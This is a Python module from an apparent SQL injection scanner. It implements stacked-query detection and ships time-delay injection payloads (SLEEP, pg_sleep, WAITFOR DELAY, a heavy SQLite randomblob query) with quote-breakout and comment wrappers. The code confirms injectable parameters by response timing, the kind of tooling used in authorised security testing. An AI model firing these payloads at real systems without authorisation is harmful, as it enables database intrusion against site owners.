"""Stacked (batched) query detection: the driver executes a second statement
after a semicolon. Confirmed via a time delay in the stacked statement, which
isolates it from the primary query's own result."""
from sqldark.techniques import Technique, Result

DELAY = 5

# {p}=prefix {s}=suffix {d}=delay. Each runs a *separate* statement after ';'.
VECTORS = [
    ("MySQL",                 "{p}; SELECT SLEEP({d}){s}"),
    ("PostgreSQL",            "{p}; SELECT pg_sleep({d}){s}"),
    ("Microsoft SQL Server",  "{p}; WAITFOR DELAY '0:0:{d}'{s}"),
    ("SQLite",                "{p}; SELECT 1 WHERE 1=like('A',upper(hex(randomblob({big}))))" + "{s}"),
]
WRAPS = [("", "-- -"), ("'", "-- -"), ("\"", "-- -"), ("')", "-- -")]


class StackedQueries(Technique):
    name = "stacked queries"
    letter = "S"

    def test(self, point, baseline):
        base_time = baseline.elapsed if baseline.elapsed > 0 else 0.3
        threshold = max(base_time + DELAY - 1.5, DELAY - 1.0)
        for dbms, tmpl in VECTORS:
            for prefix, suffix in WRAPS:
                payload = tmpl.format(p=prefix, s=suffix, d=DELAY, big=300000000)
                resp = self._send(point, payload)
                if resp.elapsed >= threshold:
                    confirm = tmpl.format(p=prefix, s=suffix, d=0, big=1)
                    cresp = self._send(point, confirm)
                    if cresp.elapsed < threshold - 1:
                        self.log.ok(f"stacked: {dbms} executed a 2nd statement "
                                    f"(delay {resp.elapsed:.1f}s) [{prefix!r}..{suffix!r}]")
                        return Result(self.name, point, vulnerable=True,
                                      payload=payload, dbms=dbms,
                                      detail={"prefix": prefix, "suffix": suffix,
                                              "elapsed": round(resp.elapsed, 2)},
                                      confidence=0.85)
        return Result(self.name, point)
